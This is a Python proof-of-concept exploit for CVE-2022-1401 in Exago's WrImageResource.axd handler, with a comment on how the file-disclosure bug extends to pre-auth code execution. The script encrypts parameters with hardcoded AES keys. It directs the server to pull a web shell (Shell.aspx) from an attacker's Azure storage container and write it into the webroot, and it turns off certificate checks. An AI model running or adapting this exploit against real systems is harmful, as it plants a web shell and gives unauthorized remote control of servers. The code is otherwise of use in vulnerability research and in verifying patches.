from Crypto.Cipher import AES
import hashlib
import os
import base64
from pypadding import iso10126
import requests
import urllib.parse

from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


"""
https://www.cvedetails.com/cve/CVE-2022-1401/ mentions that this is a file disclosure as `root`. 
While this is correct, the same handler implemented a functionality to retrieve cloud files from AWS and Azure
which subsequently will be stored on the actual appliance. The problem arises from the fact that the path 
where the file is to be stored at is also controllable, leading to a pre-auth arbitrary file write and
therefore to pre-auth RCE directly without any luck-dependend chaining.

Anyway, congratz to the researchers from bitdefender who won the publishing race on this ;)

"""

def encrypt(text):
  # define 128-bit key from a text password
  tx_key_128 = base64.b64decode("JWZHKGqV8ITXHw3/VLyFfQ==")

  # initialization vector
  tx_iv = base64.b64decode("qe2xwnaq4onei0+CuR41nQ==") 

  encoder = iso10126.Encoder(16)
  ptxt = encoder.encode(text)

  encryptor = AES.new(tx_key_128, AES.MODE_CBC, IV=tx_iv)
  tx_ctxt = encryptor.encrypt(ptxt)

  safe_string = urllib.parse.quote_plus(base64.b64encode(tx_ctxt).decode("utf-8"))
  return safe_string



# message to crypt with AES-128
t = b'/opt/Exago/'
t = encrypt(t)

f = b"Shell.aspx"
f = encrypt(f)


# azure - shell.aspx we want to write to local drive to achieve RCE
c = b"type=azure;storagekey=newcontainer/;credentials='DefaultEndpointsProtocol=https;AccountName=demotesta;AccountKey=z<snip>==;EndpointSuffix=core.windows.net';"

c = encrypt(c)


url = f"https://<ip>/Exago/WrImageResource.axd?t={t}&f={f}&c={c}"

r = requests.get(url, verify=False)
print(r.text)

print("[+] Shell now available in webroot...")
